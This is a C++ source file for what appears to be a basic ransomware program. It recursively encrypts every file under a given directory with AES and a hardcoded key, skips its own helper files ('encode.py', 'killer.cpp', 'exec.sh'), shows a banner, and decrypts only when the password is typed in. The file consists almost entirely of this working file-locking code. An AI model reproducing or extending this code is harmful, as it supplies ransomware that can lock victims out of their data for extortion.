#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <cstring>
#include <cstdio>
#include <openssl/aes.h>
#include "crypter.h"

using namespace std;
string list[]{"encode.py","killer.cpp","exec.sh","/."};			//FILES TO NOT ENCRYPT
string key="helloworld123456";									//PASSWORD
std::vector<string> v;


void whitelist(std::vector<string> &vec)
{
	string s;
	for(int i=0;i<vec.size();i++)
	{
		s=vec.at(i);

		for(string fd:list)
			
			if(s.find(fd)!=string::npos)
				vec.at(i)="";
	}
}



void encryptfiles(std::vector<string> &s)
{
	for(string fname:s)
	{
		if(fname!="")
			encrypt(fname.c_str(),key.c_str());
		else
			continue;
	}
}

void decryptfiles(std::vector<string> &s)
{
	for(string fname:s)
	{
		if(fname!="")
			decrypt(fname.c_str(),key.c_str());
		else
			continue;
	}
}



void compare()
{
	string pass;
	cout<<"Enter password:";
	cin>>pass;
	if(pass==key)
	{
		cout<<"Correct password!"<<endl;
		cout<<"Decoding files..."<<endl;
		return;
	}
	else
		cout<<"Wong password..."<<endl;
	exit(0);
}




int main(int argc,char *argv[])
{

    ifstream fp("graphic");
    cout<<fp.rdbuf()<<endl;
    fp.close();

    if(argc!=3)
    {
    	cout<<"Usage: "<<argv[0]<<" [Directory_to_encrypt] [option]"<<endl;
    	cout<<"Options: e - encrypt"<<endl<<" d - decrypt"<<endl;
    	exit(1);
    }

    std::string path = argv[1];

    for (const auto & entry : filesystem::recursive_directory_iterator(path))
        if(!filesystem::is_directory(entry.path()))
        	v.push_back(entry.path());

    if(!strcmp(argv[2],"e"))
    {
    	whitelist(v);
    	encryptfiles(v);
  		cout<<"Done"<<endl;
    }

    else if(!strcmp(argv[2],"d"))
    {
    	 compare();
    	 decryptfiles(v);
    }
}